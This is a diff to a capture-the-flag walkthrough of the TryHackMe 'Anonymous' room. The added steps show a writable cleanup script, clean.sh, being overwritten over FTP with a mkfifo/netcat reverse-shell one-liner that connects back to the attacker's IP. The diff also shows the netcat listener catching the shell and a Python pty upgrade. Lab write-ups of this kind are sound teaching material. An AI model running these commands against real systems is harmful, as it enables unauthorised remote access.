@@ -256,15 +256,36 @@ Lets check out if we can set up a reverse bash shell if we can amend/overwrite t
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4445 >/tmp/f
 ```
+Right, on our ftp server, lets transfer that from our directory to theirs. First change to the scripts directory.
+
+```
+ftp> cd scripts
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
+-rw-rw-r--    1 1000     1000         1806 Sep 07 19:17 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
+```
+Now upload our file.
+```
+ftp> put clean.sh 
+local: clean.sh remote: clean.sh
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+91 bytes sent in 0.00 secs (334.0872 kB/s)
+```
 All we need to do now is set up a netcat on our IP and port 4445. #boom
-
-Using code to get a better working shell, we can now search for the user flag. Lets all check if we can see if we have sudo permissions for any files or commands.
-
 ```
 /CTF/tryhackme/anonymous$ nc -nlvp 4445
 listening on [any] 4445 ...
 connect to [10.9.12.213] from (UNKNOWN) [10.10.82.178] 40404
 /bin/sh: 0: can't access tty; job control turned off
+```
+Using - python -c 'import pty;pty.spawn("/bin/bash")'- to get a better working shell, we can now search for the user flag. Lets all check if we can see if we have sudo permissions for any files or commands.
+```
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 namelessone@anonymous:~$ ls
 ls
